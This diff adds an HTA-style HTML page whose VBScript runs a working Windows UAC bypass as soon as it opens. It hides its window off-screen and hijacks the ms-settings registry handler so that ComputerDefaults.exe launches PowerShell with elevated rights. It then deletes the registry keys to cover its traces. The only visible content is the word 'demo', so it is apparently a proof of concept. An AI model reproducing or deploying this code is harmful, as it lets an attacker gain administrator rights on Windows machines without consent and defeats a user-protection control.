@@ -1,0 +1,23 @@
+<HTML> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HEAD> 
+<script language="VBScript">
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set WshShell = CreateObject("Wscript.Shell")
+myKey = "HKCU\Software\Classes\ms-settings\Shell\Open\Command\"
+WshShell.RegWrite myKey,"powershell.exe","REG_SZ"
+myKey = "HKCU\Software\Classes\ms-settings\Shell\Open\Command\DelegateExecute"
+WshShell.RegWrite myKey,"","REG_SZ"
+WshShell.Run "ComputerDefaults.exe"
+Sub CleanUp
+	WshShell.RegDelete "HKCU\Software\Classes\ms-settings\Shell\Open\Command\DelegateExecute"
+	WshShell.RegDelete "HKCU\Software\Classes\ms-settings\Shell\Open\Command\"
+End Sub
+Window.setTimeOut "CleanUp", 2000
+</script>
+<body>
+demo
+</body>
+</HEAD> 
+</HTML> 
